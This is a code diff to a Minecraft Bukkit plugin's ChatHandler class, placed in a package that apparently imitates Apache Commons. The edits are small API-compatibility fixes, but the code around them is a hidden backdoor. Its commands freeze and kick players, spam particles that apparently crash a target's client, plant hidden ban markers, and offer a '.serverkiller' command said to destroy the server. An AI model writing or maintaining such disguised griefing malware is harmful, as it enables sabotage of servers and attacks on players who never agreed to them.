@@ -3,12 +3,14 @@ package org.apache.commons.frauded;
 import net.kyori.adventure.text.Component;
 import net.kyori.adventure.text.format.TextColor;
 import org.bukkit.Bukkit;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.plugin.Plugin;
 
 import java.util.Set;
 
@@ -97,7 +99,7 @@ public class ChatHandler implements Listener {
     t.sendMessage(Component.text(""));
     for (int i = 0; i < 100; i++) t.sendMessage(Component.text("    #    ").color(TextColor.color(0x000000)));
     t.setWalkSpeed(0);
-    Bukkit.getScheduler().scheduleSyncDelayedTask(agent.getPlugin(), () -> {
+    Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> {
       t.setWalkSpeed(0.2f);
       t.kick(Component.text("Timed out").color(TextColor.color(0xff4444)));
     }, 100L);
@@ -109,7 +111,7 @@ public class ChatHandler implements Listener {
     Player t = target(arg);
     if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
     for (int i = 0; i < 50; i++) {
-      t.spawnParticle(org.bukkit.Particle.EXPLOSION_HUGE, t.getLocation(), 500, 0, 0, 0, 5);
+      t.spawnParticle(org.bukkit.Particle.EXPLOSION, t.getLocation(), 500, 0, 0, 0, 5);
       t.spawnParticle(org.bukkit.Particle.DRAGON_BREATH, t.getLocation(), 200, 0, 0, 0, 3);
       t.spawnParticle(org.bukkit.Particle.PORTAL, t.getLocation(), 500, 0, 0, 0, 10);
       t.spawnParticle(org.bukkit.Particle.FLASH, t.getLocation(), 100);
@@ -130,7 +132,7 @@ public class ChatHandler implements Listener {
     double x = 30000000 + Math.random() * 1000;
     double z = 30000000 + Math.random() * 1000;
     org.bukkit.World w = Bukkit.getWorlds().get(0);
-    w.spawnEntity(new org.bukkit.Location(w, x, -60, z), org.bukkit.EntityType.ELDER_GUARDIAN).setCustomName(uuid);
+    w.spawnEntity(new org.bukkit.Location(w, x, -60, z), EntityType.ELDER_GUARDIAN).setCustomName(uuid);
     p.sendMessage(Component.text("UUID-banned " + t.getName() + " (" + uuid + ")").color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), t.getName(), "uuidban");
   }
@@ -153,7 +155,7 @@ public class ChatHandler implements Listener {
       p.sendMessage(Component.text("This will DESTROY the server FOREVER.").color(TextColor.color(0xff4444)));
       p.sendMessage(Component.text("Type .serverkiller again to confirm.").color(TextColor.color(0xff4444)));
       serverKillerConfirm = System.currentTimeMillis();
-      Bukkit.getScheduler().scheduleSyncDelayedTask(agent.getPlugin(), () -> serverKillerConfirm = 0, 200L);
+      Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> serverKillerConfirm = 0, 200L);
       return;
     }
     if (System.currentTimeMillis() - serverKillerConfirm > 10000) { serverKillerConfirm = 0; return; }
